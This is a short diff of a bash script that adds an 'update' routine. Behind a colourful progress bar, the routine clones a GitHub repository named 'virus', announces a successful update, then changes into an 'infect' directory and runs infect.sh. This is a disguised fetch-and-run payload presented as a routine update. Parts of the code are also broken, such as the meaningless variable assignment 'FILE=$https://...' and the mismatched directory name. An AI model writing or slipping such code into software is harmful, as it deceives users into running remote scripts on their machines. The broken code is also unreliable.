@@ -234,4 +234,27 @@ echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
 # While process is running...
-while git clone 
+while git clone https://github.com/BlackStormHere/virus 2> /dev/null; do
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=$https://github.com/BlackStormHere/virus
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
